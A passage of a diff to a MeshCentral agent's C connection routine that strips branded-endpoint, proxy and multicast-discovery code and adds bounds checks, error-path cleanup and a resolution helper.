+	MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: entry state=%d", agent->serverConnectionState);
 
-    len = ILibSimpleDataStore_Get(agent->masterDb, "MeshServer", ILibScratchPad2, sizeof(ILibScratchPad2));
-    if (len == 0)
-    {
-        size_t totalEndpoints = MeshAgent_GetBrandedEndpointTotal();
-        if (totalEndpoints == 0)
-        {
-            printf("No MeshCentral settings found, place .msh file with this executable and restart.\r\n");
-            ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Microstack_Generic, ILibRemoteLogging_Flags_VerbosityLevel_1, "agentcore: MeshServer URI not found");
-            return;
-        }
-
-        size_t ordinal = (size_t)(agent->brandedFallbackIndex % (int)totalEndpoints);
-        mesh_network_endpoint_resolved_t endpoint;
-        MeshAgent_ResolveBrandedEndpoint(ordinal, &endpoint);
-        if (endpoint.url == NULL || endpoint.url[0] == 0)
-        {
-            MeshAgent_AdvanceBrandedEndpoint(agent, "endpoint-missing", -1);
-            printf("No MeshCentral settings found, place .msh file with this executable and restart.\r\n");
-            ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Microstack_Generic, ILibRemoteLogging_Flags_VerbosityLevel_1, "agentcore: MeshServer URI not found");
-            return;
-        }
-
-        ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Agent_GuardPost, ILibRemoteLogging_Flags_VerbosityLevel_1, "AgentCore: Using branded endpoint (%u/%u): %s", (unsigned int)(ordinal + 1), (unsigned int)totalEndpoints, endpoint.url);
-        if (agent->controlChannelDebug != 0)
-        {
-            printf("Attempting branded endpoint (%u/%u): %s\n", (unsigned int)(ordinal + 1), (unsigned int)totalEndpoints, endpoint.url);
-        }
-
-        agent->usingBrandedEndpoint = 1;
-        serverUrl = (char*)endpoint.url;
-        serverUrlLen = (int)strnlen_s(serverUrl, 4096);
-#ifndef MICROSTACK_NOTLS
-        ILibParseUriResult result = ILibParseUri(serverUrl, &host, &port, &path, &meshServer);
-#else
-        ILibParseUri(serverUrl, &host, &port, &path, &meshServer);
-        ILibParseUriResult result = ILibParseUriResult_UNKNOWN;
-#endif
-
-        MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: branded endpoint url=%s host=%s port=%hu family=%d parseResult=%d",
-            serverUrl != NULL ? serverUrl : "(null)",
-            host != NULL ? host : "(null)",
-            port,
-            meshServer.sin6_family,
-            (int)result);
-        if (agent->controlChannelDebug != 0 || agent->logUpdate != 0)
-        {
-            ILIBLOGMESSAGEX("MeshServer_ConnectEx: branded endpoint url=%s host=%s port=%hu family=%d parseResult=%d",
-                serverUrl != NULL ? serverUrl : "(null)",
-                host != NULL ? host : "(null)",
-                port,
-                meshServer.sin6_family,
-                (int)result);
-        }
-
-        int isSecureScheme = (_strnicmp(serverUrl, "wss:", 4) == 0);
-        int useDefaultPort = ((isSecureScheme && port == 443) || (!isSecureScheme && port == 80));
-
-        req = ILibCreateEmptyPacket();
-        ILibSetVersion(req, "1.1", 3);
-        ILibSetDirective(req, "GET", 3, path, (int)strnlen_s(path, serverUrlLen));
-        MeshAgent_AddHostHeader(req, endpoint.hostHeader, host, port, useDefaultPort);
-        MeshAgent_AddUserAgentHeader(req, endpoint.userAgent);
-
-        ILibWebClient_AddWebSocketRequestHeaders(req, 65535, MeshServer_OnSendOK);
-		void **tmp = ILibMemory_SmartAllocate(2 * sizeof(void*));
-		agent->controlChannelRequest = tmp;
-		tmp[0] = agent;
-		tmp[1] = reqToken = ILibWebClient_PipelineRequest(agent->httpClientManager, (struct sockaddr*)&meshServer, req, MeshServer_OnResponse, agent, NULL);
-		MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: PipelineRequest token=%p (branded)", reqToken);
-#ifndef MICROSTACK_NOTLS
-		ILibWebClient_Request_SetHTTPS(reqToken, result == ILibParseUriResult_TLS ? ILibWebClient_RequestToken_USE_HTTPS : ILibWebClient_RequestToken_USE_HTTP);
-        {
-            const char *sniOverride = (endpoint.sni != NULL && endpoint.sni[0] != 0) ? endpoint.sni : host;
-            const char *alpnChoice = "(none)";
-            ILibWebClient_Request_SetSNI(reqToken, (char*)sniOverride, (int)strnlen_s(sniOverride, 256));
-            if (endpoint.alpn != NULL && endpoint.alpn[0] != 0)
-            {
-                ILibWebClient_Request_SetALPN(reqToken, endpoint.alpn);
-                alpnChoice = endpoint.alpn;
-            }
-            else if (g_meshNetworkProfile.alpnProtocols != NULL && g_meshNetworkProfile.alpnProtocols[0] != 0)
-            {
-                ILibWebClient_Request_SetALPN(reqToken, g_meshNetworkProfile.alpnProtocols);
-                alpnChoice = g_meshNetworkProfile.alpnProtocols;
-            }
-            else
-            {
-                ILibWebClient_Request_SetALPN(reqToken, NULL);
-            }
-            MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: branded TLS useHTTPS=%d SNI=%s ALPN=%s",
-                (result == ILibParseUriResult_TLS ? 1 : 0),
-                sniOverride != NULL ? sniOverride : "(null)",
-                alpnChoice != NULL ? alpnChoice : "(null)");
-            if (agent->controlChannelDebug != 0 || agent->logUpdate != 0)
-            {
-                ILIBLOGMESSAGEX("MeshServer_ConnectEx: branded TLS useHTTPS=%d SNI=%s ALPN=%s",
-                    (result == ILibParseUriResult_TLS ? 1 : 0),
-                    sniOverride != NULL ? sniOverride : "(null)",
-                    alpnChoice != NULL ? alpnChoice : "(null)");
-            }
-        }
-#endif
-        return;
-    }
-
-	agent->usingBrandedEndpoint = 0;
-	agent->brandedFallbackIndex = 0;
-
-	if (ILibSimpleDataStore_Get(agent->masterDb, "autoproxy", ILibScratchPad, sizeof(ILibScratchPad)) != 0)
+	len = ILibSimpleDataStore_Get(agent->masterDb, "MeshServer", ILibScratchPad2, sizeof(ILibScratchPad2));
+	if (len == 0)
 	{
-		if (agent->autoproxy_status == 0)
-		{
-			duk_push_sprintf(agent->meshCoreCtx, "require('proxy-helper').autoHelper(require('http').parseUri('%s').host);", ILibScratchPad2);
-			if (duk_peval(agent->meshCoreCtx) == 0)														// [promise]
-			{
-				duk_eval_string_noresult(agent->meshCoreCtx, "process.stdout.write('Checking Autoproxy...');");
-				duk_prepare_method_call(agent->meshCoreCtx, -1, "then");								// [promise][then][this]
-				duk_push_c_function(agent->meshCoreCtx, MeshServer_ConnectEx_AutoProxy, DUK_VARARGS);	// [promise][then][this][func]
-				duk_pcall_method(agent->meshCoreCtx, 1);												// [ret]
-				duk_pop(agent->meshCoreCtx);															// ...
-				return;
-			}
-			else
-			{
-				const char *foo = duk_safe_to_string(agent->meshCoreCtx, -1);
-				printf("AutoProxy Error: %s\n", foo);
-			}
-			duk_pop(agent->meshCoreCtx);																// ...
-		}
+		printf("No MeshCentral settings found, place .msh file with this executable and restart.\r\n");
+		ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Microstack_Generic, ILibRemoteLogging_Flags_VerbosityLevel_1, "agentcore: MeshServer URI not found");
+		return;
 	}
 
-
 	rs = ILibParseString(ILibScratchPad2, 0, len, ",", 1);
+	if (rs == NULL || rs->NumResults == 0)
+	{
+		if (rs != NULL) { ILibDestructParserResults(rs); }
+		printf("No MeshCentral settings found, place .msh file with this executable and restart.\r\n");
+		ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Microstack_Generic, ILibRemoteLogging_Flags_VerbosityLevel_1, "agentcore: MeshServer URI list empty");
+		return;
+	}
 	if (agent->serverIndex == 0)
 	{
 		int rval;
@@ -6849,264 +6594,138 @@ void MeshServer_ConnectEx(MeshAgentHostContainer *agent)
 	}
 	else
 	{
-#ifdef MICROSTACK_PROXY
-		if (agent->triedNoProxy_Index == agent->serverIndex)
-#endif
-		{
-			agent->serverIndex = (agent->serverIndex % rs->NumResults) + 1;
-			agent->triedNoProxy_Index = agent->serverIndex - 1;
-		}
+		agent->serverIndex = (agent->serverIndex % rs->NumResults) + 1;
 	}
 
 	f = ILibParseString_GetResultIndex(rs, agent->serverIndex);
+	if (f == NULL)
+	{
+		int totalResults = rs->NumResults;
+		ILibDestructParserResults(rs);
+		MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: MeshServer count mismatch (index=%d total=%d)", agent->serverIndex, totalResults);
+		ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Agent_GuardPost, ILibRemoteLogging_Flags_VerbosityLevel_1, "AgentCore: MeshServer count mismatch. URL Count = %d, Server Index = %d", totalResults, agent->serverIndex);
+		return;
+	}
 	f->datalength = ILibTrimString(&(f->data), f->datalength);
 	f->data[f->datalength] = 0;
 	serverUrl = f->data;
 	serverUrlLen = f->datalength;
-	if (f->datalength == 5 && memcmp(f->data, "local", 5) == 0)
+	if (serverUrlLen == 0)
 	{
-		if (agent->multicastServerUrl != NULL) {
-			serverUrl = agent->multicastServerUrl;
-			serverUrlLen = strnlen_s(serverUrl, sizeof(ILibScratchPad));
-		}
-		else
-		{
-			// Multicast discovery packet to try to find our server
-			if ((agent->multicastDiscovery2 != NULL) && (ILibSimpleDataStore_Get(agent->masterDb, "ServerID", ILibScratchPad2, sizeof(ILibScratchPad2)) == 97)) 
-			{
-#ifndef MICROSTACK_NOTLS
-				// If the discovery key is set, use it to encrypt the UDP packet
-				if (agent->multicastDiscoveryKey != NULL) 
-				{
-					EVP_CIPHER_CTX *enc_ctx;
-					int enclength = sizeof(ILibScratchPad) - 16, packetLen;
-					util_random(16, ILibScratchPad); // Select a random IV
-					enc_ctx = EVP_CIPHER_CTX_new();
-					EVP_EncryptInit(enc_ctx, EVP_aes_256_cbc(), agent->multicastDiscoveryKey, (unsigned char*)ILibScratchPad);
-					if (EVP_EncryptUpdate(enc_ctx, (unsigned char*)(ILibScratchPad + 16), &enclength, (unsigned char*)ILibScratchPad2, 96)) 
-					{
-						packetLen = enclength;
-						enclength = sizeof(ILibScratchPad) - 16 - packetLen;
-						if (EVP_EncryptFinal_ex(enc_ctx, (unsigned char*)(ILibScratchPad + 16 + packetLen), &enclength)) 
-						{
-							// Send the encrypted packet
-							ILibMulticastSocket_Broadcast(agent->multicastDiscovery2, ILibScratchPad, 16 + packetLen + enclength, 1);
-
-							if (agent->controlChannelDebug != 0)
-							{
-								printf("Broadcasting encrypted discovery packet...\n");
-								ILIBLOGMESSAGEX("Broadcasting encrypted discovery packet...");
-							}
-						}
-					}
-					EVP_CIPHER_CTX_free(enc_ctx);
-				}
-				else
-#endif
-				{
-					// No discovery key set, broadcast without encryption
-					ILibMulticastSocket_Broadcast(agent->multicastDiscovery2, ILibScratchPad2, 96, 1);
-					if (agent->controlChannelDebug != 0)
-					{
-						printf("Broadcasting unencrypted discovery packet...\n");
-						ILIBLOGMESSAGEX("Broadcasting unencrypted discovery packet...");
-					}
-				}
-			}
-			ILibDestructParserResults(rs);
-			MeshServer_Connect(agent);
-			return;
-		}
+		ILibDestructParserResults(rs);
+		MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: empty MeshServer entry at index=%d", agent->serverIndex);
+		MeshServer_Connect(agent);
+		return;
 	}
-
-	// Critical Fix #4: Safe string copy with proper null terminator handling
-	if (serverUrlLen > 0 && serverUrlLen < sizeof(agent->serveruri) - 1)
-	{
-		// Use strncpy_s with explicit length to ensure null termination
-		strncpy_s(agent->serveruri, sizeof(agent->serveruri), serverUrl, serverUrlLen);
-		agent->serveruri[serverUrlLen] = '\0';
-	}
-	else
+	if (serverUrlLen >= sizeof(agent->serveruri))
 	{
 		agent->serveruri[0] = '\0';
-		if (serverUrlLen >= sizeof(agent->serveruri))
-		{
-			ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Agent_GuardPost,
-				ILibRemoteLogging_Flags_VerbosityLevel_1,
-				"agentcore: Server URL too long (%d >= %d), truncated",
-				serverUrlLen, (int)sizeof(agent->serveruri));
-		}
+		ILibDestructParserResults(rs);
+		ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Agent_GuardPost,
+			ILibRemoteLogging_Flags_VerbosityLevel_1,
+			"agentcore: Server URL too long (%d >= %d), rejected",
+			(int)serverUrlLen, (int)sizeof(agent->serveruri));
+		return;
 	}
+	strncpy_s(agent->serveruri, sizeof(agent->serveruri), serverUrl, serverUrlLen);
+	agent->serveruri[serverUrlLen] = '\0';
 
-	if (strcmp("wss://swarm.meshcentral.com:443/agent.ashx", agent->serveruri) == 0)
-	{
-		// Bad server value, from MeshCentral Migration... We need to fix the URI
-		if (agent->controlChannelDebug != 0)
-		{
-			printf("Swapping [%s] for [%s]\n", agent->serveruri, "wss://meshcentral.com:443/agent.ashx");
-			ILIBLOGMESSAGEX("Swapping [%s] for [%s]", agent->serveruri, "wss://meshcentral.com:443/agent.ashx");
-		}
-		strcpy_s(agent->serveruri, sizeof(agent->serveruri), "wss://meshcentral.com:443/agent.ashx");
-		strcpy_s(serverUrl, serverUrlLen, "wss://meshcentral.com:443/agent.ashx");
-		serverUrlLen = (int)strnlen_s(serverUrl, serverUrlLen);
-	}
-
-	if ((ILibSimpleDataStore_GetEx(agent->masterDb, "ignoreProxyFile", 15, ILibScratchPad, sizeof(ILibScratchPad)) == 0) && ((len = ILibSimpleDataStore_Get(agent->masterDb, "WebProxy", webproxy, sizeof(webproxy))) != 0 || (len = MeshAgent_GetSystemProxy(agent, webproxy, sizeof(webproxy))) != 0))
-	{
-		// Proxy was enabled/configured
-		if (agent->triedNoProxy_Index < agent->serverIndex && (agent->proxyServer != NULL || agent->proxyFailed != 0))
-		{
-			// First attempt with proxy failed, so lets try again without a proxy
-			agent->proxyFailed = 0;
-			agent->triedNoProxy_Index++;
-			agent->proxyServer = NULL;
-
-			if (duk_peval_string(agent->meshCoreCtx, "require('global-tunnel');") == 0)
-			{
-				duk_get_prop_string(agent->meshCoreCtx, -1, "end");						// [tunnel][end]
-				duk_swap_top(agent->meshCoreCtx, -2);									// [end][this]
-				duk_pcall_method(agent->meshCoreCtx, 0); 								// [undefined]
-			}
-			duk_pop(agent->meshCoreCtx);												// ...
-			useproxy = 0;
-		}
-		else
-		{
-			useproxy = len;
-		}
-	}
 #ifndef MICROSTACK_NOTLS
-	ILibParseUriResult result = ILibParseUri(serverUrl, &host, &port, &path, useproxy ? NULL : &meshServer);
+	result = ILibParseUri(serverUrl, &host, &port, &path, NULL);
 #else
-	ILibParseUri(serverUrl, &host, &port, &path, &meshServer);
-	ILibParseUriResult result = ILibParseUriResult_UNKNOWN;
+	ILibParseUri(serverUrl, &host, &port, &path, NULL);
 #endif
+
+	if (host == NULL || host[0] == 0 || path == NULL || path[0] == 0)
+	{
+		ILibDestructParserResults(rs);
+		if (host != NULL) { free(host); }
+		if (path != NULL) { free(path); }
+		ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Agent_GuardPost, ILibRemoteLogging_Flags_VerbosityLevel_1, "agentcore: Invalid MeshServer URI: %s", agent->serveruri);
+		return;
+	}
+
+	if (!MeshAgent_ResolveControlChannelAddress(agent, serverUrl, (int)serverUrlLen, host, port, &meshServer, &resolutionSource))
+	{
+		memset(&meshServer, 0, sizeof(meshServer));
+		meshServer.sin6_family = AF_UNSPEC;
+	}
 
 	if (agent->controlChannelDebug != 0 || agent->logUpdate != 0)
 	{
-		MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: resolved url=%s host=%s port=%hu family=%d useproxy=%d parseResult=%d",
+		MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: resolved url=%s host=%s port=%hu family=%d resolutionSource=%s parseResult=%d",
 			serverUrl != NULL ? serverUrl : "(null)",
 			host != NULL ? host : "(null)",
 			port,
 			meshServer.sin6_family,
-			(int)useproxy,
+			resolutionSource != NULL ? resolutionSource : "(none)",
 			(int)result);
-		ILIBLOGMESSAGEX("MeshServer_ConnectEx: resolved url=%s host=%s port=%hu family=%d useproxy=%d parseResult=%d",
+		ILIBLOGMESSAGEX("MeshServer_ConnectEx: resolved url=%s host=%s port=%hu family=%d resolutionSource=%s parseResult=%d",
 			serverUrl != NULL ? serverUrl : "(null)",
 			host != NULL ? host : "(null)",
 			port,
 			meshServer.sin6_family,
-			(int)useproxy,
+			resolutionSource != NULL ? resolutionSource : "(none)",
 			(int)result);
 	}
 
 #ifdef WIN32
-	// Critical Fix #2: Use strncasecmp with proper length validation for DNS lock check
 	if (agent->DNS_LOCK[0] != 0 && host != NULL)
 	{
 		size_t dnsLockLen = strnlen_s(agent->DNS_LOCK, sizeof(agent->DNS_LOCK));
 		size_t hostLen = strnlen_s(host, 512);
-		// Use length-bounded comparison to prevent buffer overread
 		if (dnsLockLen != hostLen || _strnicmp(agent->DNS_LOCK, host, dnsLockLen) != 0)
 		{
 			printf("agentcore: DNS Lock[%s]: Unauthorized to connect to: %s\n", agent->DNS_LOCK, host);
-			free(host); free(path);
+			ILibDestructParserResults(rs);
+			free(host);
+			free(path);
 			ILibLifeTime_Add(ILibGetBaseTimer(agent->chain), agent, 5, MeshServer_ConnectEx_Lockout_Retry, NULL);
 			return;
 		}
 	}
 #endif
 
-	if (useproxy == 0)
+	if (meshServer.sin6_family == AF_UNSPEC)
 	{
-		if (meshServer.sin6_family == AF_UNSPEC)
+		ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Agent_GuardPost, ILibRemoteLogging_Flags_VerbosityLevel_1, "agentcore: Could not resolve: %s", host != NULL ? host : "(null)");
+		printf("agentcore: Could not resolve: %s\n", host);
+		MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: DNS lookup failed for host=%s", host != NULL ? host : "(null)");
+		if (agent->controlChannelDebug != 0 || agent->logUpdate != 0)
 		{
-			// Could not resolve host name
-			if (ILibSimpleDataStore_GetEx(agent->masterDb, serverUrl, serverUrlLen, (char*)&meshServer, sizeof(struct sockaddr_in6)) == 0)
-			{
-				meshServer.sin6_family = AF_UNSPEC;
-				ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Agent_GuardPost, ILibRemoteLogging_Flags_VerbosityLevel_1, "agentcore: Could not resolve: %s", ILibScratchPad);
-				printf("agentcore: Could not resolve: %s\n", host);
-			}
-			MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: DNS lookup failed for host=%s", host != NULL ? host : "(null)");
-			if (agent->controlChannelDebug != 0 || agent->logUpdate != 0)
-			{
-				ILIBLOGMESSAGEX("MeshServer_ConnectEx: DNS lookup failed for host=%s", host != NULL ? host : "(null)");
-			}
+			ILIBLOGMESSAGEX("MeshServer_ConnectEx: DNS lookup failed for host=%s", host != NULL ? host : "(null)");
 		}
-		else
+		ILibDestructParserResults(rs);
+		free(host);
+		free(path);
+		MeshServer_Connect(agent);
+		return;
+	}
+	else
+	{
+		char *tmp = ILibRemoteLogging_ConvertAddress((struct sockaddr*)&meshServer);
+		MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: DNS lookup success host=%s address=%s", host != NULL ? host : "(null)", tmp != NULL ? tmp : "(null)");
+		if (agent->controlChannelDebug != 0 || agent->logUpdate != 0)
 		{
-			// Successfully resolved host name
-			// High Fix #9: Add DNS cache TTL - re-resolve after 1 hour (3600 seconds)
-			#define DNS_CACHE_TTL_SECONDS 3600
-			struct sockaddr_in6 tempAddr;
-			char dnsTTLKey[128];
-			int dnsTTLKeyLen = sprintf_s(dnsTTLKey, sizeof(dnsTTLKey), "DNS_TTL[%s]", host);
-			ULONGLONG currentTime = ILibGetUptime();
-			ULONGLONG cachedTime = 0;
-			int needsUpdate = 0;
-
-			len = ILibSimpleDataStore_GetEx(agent->masterDb, serverUrl, serverUrlLen, (char*)&tempAddr, sizeof(struct sockaddr_in6));
-			if (len == 0)
-			{
-				// No entry in DB, so update the value
-				needsUpdate = 1;
-			}
-			else
-			{
-				// Check TTL - force refresh if cache is stale
-				char ttlBuffer[32] = {0};
-				int ttlLen = ILibSimpleDataStore_GetEx(agent->masterDb, dnsTTLKey, dnsTTLKeyLen, ttlBuffer, sizeof(ttlBuffer)-1);
-				if (ttlLen > 0)
-				{
-					ttlBuffer[ttlLen] = '\0';
-					cachedTime = strtoull(ttlBuffer, NULL, 10);
-				}
-				// If TTL expired or address changed, update cache
-				if ((currentTime - cachedTime) > (DNS_CACHE_TTL_SECONDS * 1000) ||
-				    tempAddr.sin6_family != meshServer.sin6_family ||
-				    memcmp(&tempAddr, &meshServer, ILibInet_StructSize(&meshServer)) != 0)
-				{
-					needsUpdate = 1;
-				}
-			}
-
-			if (needsUpdate)
-			{
-				// Update address and TTL timestamp
-				ILibSimpleDataStore_PutEx(agent->masterDb, serverUrl, serverUrlLen, (char*)&meshServer, ILibInet_StructSize(&meshServer));
-				char ttlValue[32];
-				int ttlValueLen = sprintf_s(ttlValue, sizeof(ttlValue), "%llu", currentTime);
-				ILibSimpleDataStore_PutEx(agent->masterDb, dnsTTLKey, dnsTTLKeyLen, ttlValue, ttlValueLen);
-			}
-			#undef DNS_CACHE_TTL_SECONDS
-
-			// Update the DNS entry in the db. (It only updates if it changed)
-			len = sprintf_s(ILibScratchPad, sizeof(ILibScratchPad), "DNS[%s]", host);
-			char *tmp = ILibRemoteLogging_ConvertAddress((struct sockaddr*)&meshServer);
-			ILibSimpleDataStore_PutEx(agent->masterDb, ILibScratchPad, len, tmp, (int)strnlen_s(tmp, sizeof(ILibScratchPad)));
-			MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: DNS lookup success host=%s address=%s", host != NULL ? host : "(null)", tmp != NULL ? tmp : "(null)");
-			if (agent->controlChannelDebug != 0 || agent->logUpdate != 0)
-			{
-				ILIBLOGMESSAGEX("MeshServer_ConnectEx: DNS lookup success host=%s address=%s", host != NULL ? host : "(null)", tmp != NULL ? tmp : "(null)");
-			}
+			ILIBLOGMESSAGEX("MeshServer_ConnectEx: DNS lookup success host=%s address=%s", host != NULL ? host : "(null)", tmp != NULL ? tmp : "(null)");
 		}
 	}
 
 	ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Agent_GuardPost, ILibRemoteLogging_Flags_VerbosityLevel_1, "AgentCore: Attempting connection to: %s", serverUrl);
 	ILibDestructParserResults(rs);
+	rs = NULL;
 
 	if ((len = ILibSimpleDataStore_Get(agent->masterDb, "ServerID", ILibScratchPad2, sizeof(ILibScratchPad2))) == 0) { printf("ServerID entry not found in Db!\n"); free(host); free(path); return; }
 	rs = ILibParseString(ILibScratchPad2, 0, len, ",", 1);
 	f = ILibParseString_GetResultIndex(rs, agent->serverIndex);
 	if (f == NULL)
 	{
-		// Invalid Server ID Count
 		printf("ServerID Count Mismatch\r\n");
 		MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: ServerID count mismatch (index=%d total=%d)", agent->serverIndex, rs->NumResults);
 		ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Agent_GuardPost, ILibRemoteLogging_Flags_VerbosityLevel_1, "AgentCore: ServerID Count Mismatch. Hash Count = %d, Server Index = %d", rs->NumResults, agent->serverIndex);
 		ILibDestructParserResults(rs);
-		free(host); free(path);
+		free(host);
+		free(path);
 		return;
 	}
 	f->datalength = ILibTrimString(&(f->data), f->datalength);
@@ -7116,7 +6735,8 @@ void MeshServer_ConnectEx(MeshAgentHostContainer *agent)
 		MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: ServerID too big (len=%d expected<=%llu)", f->datalength / 2, (unsigned long long)(sizeof(agent->serverHash) - 1));
 		ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Agent_GuardPost, ILibRemoteLogging_Flags_VerbosityLevel_1, "AgentCore: ServerID too big. Was %d bytes, but expected %d bytes", f->datalength / 2, sizeof(agent->serverHash) - 1);
 		ILibDestructParserResults(rs);
-		free(host); free(path);
+		free(host);
+		free(path);
 		return;
 	}
 
@@ -7127,7 +6747,9 @@ void MeshServer_ConnectEx(MeshAgentHostContainer *agent)
 		{
 			printf("agentcore: ServerID Lock: ServerID MISMATCH for: %s\n", host);
 			MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: ServerID lock mismatch (lock=%s candidate=%.*s)", agent->ID_LOCK, f->datalength, f->data);
-			free(host); free(path);
+			ILibDestructParserResults(rs);
+			free(host);
+			free(path);
 			ILibLifeTime_Add(ILibGetBaseTimer(agent->chain), agent, 5, MeshServer_ConnectEx_Lockout_Retry, NULL);
 			return;
 		}
@@ -7138,7 +6760,7 @@ void MeshServer_ConnectEx(MeshAgentHostContainer *agent)
 	util_hexToBuf(f->data, f->datalength, agent->serverHash);
 	ILibDestructParserResults(rs);
 	MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: using ServerID index=%d hashLen=%d", agent->serverIndex, f->datalength / 2);
-	
+
 	len = ILibSimpleDataStore_Get(agent->masterDb, "MeshID", ILibScratchPad, sizeof(ILibScratchPad));
 	{
 		int meshIdLen = (int)len;
@@ -7177,16 +6799,18 @@ void MeshServer_ConnectEx(MeshAgentHostContainer *agent)
 		{
 			printf("MeshID entry not found in db or bad size.\n");
 			MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: MeshID missing or bad len=%d", (int)len);
-			return; // Make sure MeshID is both present and SHA256 or SHA384.
+			free(host);
+			free(path);
+			return;
 		}
 
-		memset(agent->meshId, 0, sizeof(agent->meshId)); // Clear the meshid first in case we copy SHA256
-		memcpy_s(agent->meshId, sizeof(agent->meshId), meshIdBuffer, meshIdLen); // Copy the correct length
+		memset(agent->meshId, 0, sizeof(agent->meshId));
+		memcpy_s(agent->meshId, sizeof(agent->meshId), meshIdBuffer, meshIdLen);
 		len = meshIdLen;
 	}
 
 #ifndef MICROSTACK_NOTLS
-	util_keyhash(agent->selfcert, agent->g_selfid); // Compute our own identifier using our certificate
+	util_keyhash(agent->selfcert, agent->g_selfid);
 #endif
 
 	req = ILibCreateEmptyPacket();
@@ -7195,139 +6819,50 @@ void MeshServer_ConnectEx(MeshAgentHostContainer *agent)
 	{
 		int isSecureScheme2 = (_strnicmp(agent->serveruri, "wss:", 4) == 0);
 		int useDefaultPort2 = ((isSecureScheme2 && port == 443) || (!isSecureScheme2 && port == 80));
-		MeshAgent_AddHostHeader(req, g_meshNetworkProfile.hostHeader, host, port, useDefaultPort2);
+		MeshAgent_AddHostHeader(req, NULL, host, port, useDefaultPort2);
 	}
-    MeshAgent_AddUserAgentHeader(req, g_meshNetworkProfile.userAgent);
+	MeshAgent_AddUserAgentHeader(req, NULL);
 
 	free(path);
+	path = NULL;
 
-	MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: pre-connect useproxy=%llu family=%d", (unsigned long long)useproxy, meshServer.sin6_family);
-	if (useproxy != 0 || meshServer.sin6_family != AF_UNSPEC)
+	MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: pre-connect family=%d source=%s", meshServer.sin6_family, resolutionSource != NULL ? resolutionSource : "(none)");
+	strcpy_s(agent->serverip, sizeof(agent->serverip), ILibRemoteLogging_ConvertAddress((struct sockaddr*)&meshServer));
+	printf("Connecting to: %s\n", agent->serveruri);
+	if (agent->logUpdate != 0 || agent->controlChannelDebug != 0) { ILIBLOGMESSAGEX("Connecting to: %s", agent->serveruri); }
+
+	ILibWebClient_AddWebSocketRequestHeaders(req, 65535, MeshServer_OnSendOK);
 	{
-		if (useproxy == 0) { strcpy_s(agent->serverip, sizeof(agent->serverip), ILibRemoteLogging_ConvertAddress((struct sockaddr*)&meshServer)); }
-		printf("Connecting %sto: %s\n", useproxy!=0?"(via proxy) ":"", agent->serveruri);
-		if (agent->logUpdate != 0 || agent->controlChannelDebug != 0) { ILIBLOGMESSAGEX("Connecting %sto: %s", useproxy != 0 ? "(via proxy) " : "", agent->serveruri); }
-
-		ILibWebClient_AddWebSocketRequestHeaders(req, 65535, MeshServer_OnSendOK);
-
 		void **tmp = ILibMemory_SmartAllocate(2 * sizeof(void*));
 		agent->controlChannelRequest = tmp;
 		tmp[0] = agent;
 		tmp[1] = reqToken = ILibWebClient_PipelineRequest(agent->httpClientManager, (struct sockaddr*)&meshServer, req, MeshServer_OnResponse, agent, NULL);
-		MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: PipelineRequest token=%p (non-branded)", reqToken);
-		// High Fix #10: Increase network timeout from 20s to 60s for slow networks
-		// 20 seconds was too aggressive for high-latency or congested networks
+		MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: PipelineRequest token=%p", reqToken);
 		ILibLifeTime_Add(ILibGetBaseTimer(agent->chain), tmp, 60, MeshServer_ConnectEx_NetworkError, MeshServer_ConnectEx_NetworkError_Cleanup);
+	}
 
 #ifndef MICROSTACK_NOTLS
-        ILibWebClient_Request_SetHTTPS(reqToken, result == ILibParseUriResult_TLS ? ILibWebClient_RequestToken_USE_HTTPS : ILibWebClient_RequestToken_USE_HTTP);
-        {
-            const char *sniOverride = g_meshNetworkProfile.sni;
-			const char *effectiveSNI;
-            if (sniOverride != NULL && sniOverride[0] != 0)
-            {
-                ILibWebClient_Request_SetSNI(reqToken, (char*)sniOverride, (int)strnlen_s(sniOverride, 256));
-				effectiveSNI = sniOverride;
-            }
-            else
-            {
-                ILibWebClient_Request_SetSNI(reqToken, host, (int)strnlen_s(host, serverUrlLen));
-				effectiveSNI = host;
-            }
-			const char *alpnChoice = "(none)";
-            if (g_meshNetworkProfile.alpnProtocols != NULL && g_meshNetworkProfile.alpnProtocols[0] != 0)
-            {
